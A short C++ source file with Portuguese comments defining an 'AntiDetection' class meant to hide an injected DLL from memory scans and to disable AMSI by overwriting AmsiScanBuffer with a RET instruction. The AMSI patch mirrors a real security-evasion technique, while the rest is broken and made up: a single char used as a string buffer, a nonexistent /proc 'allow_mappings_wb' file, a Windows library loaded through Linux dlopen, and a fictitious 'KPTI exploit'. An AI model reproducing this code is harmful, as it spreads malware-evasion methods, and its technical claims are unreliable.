#include "bypass.h"
#include <unistd.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <linux/ptrace.h>
#include <dlfcn.h>
#include <cstdlib>

// Oculta DLL injetada do scan de memoria
void AntiDetection::HideModuleFromScan(uintptr_t targetPid) {
    char command;
    snprintf(command, sizeof(command),
             "echo 0 | sudo tee /proc/%lu/allow_mappings_wb\n",
             targetPid); // Exploit do KPTI (2023)
    system(command);
}

// Desativa AMSI (Anti-Malware Scan Interface)
void AntiDetection::PatchAMSI() {
    void* amsi = dlopen("libamsi.so", RTLD_LAZY);
    if (amsi) {
        void* amsiScan = dlsym(amsi, "AmsiScanBuffer");
        if (amsiScan) {
            mprotect(amsiScan, 1, PROT_READ | PROT_WRITE | PROT_EXEC);
            *(uint8_t*)amsiScan = 0xC3; // RET
            mprotect(amsiScan, 1, PROT_READ | PROT_EXEC);
        }
        dlclose(amsi);
    }
}
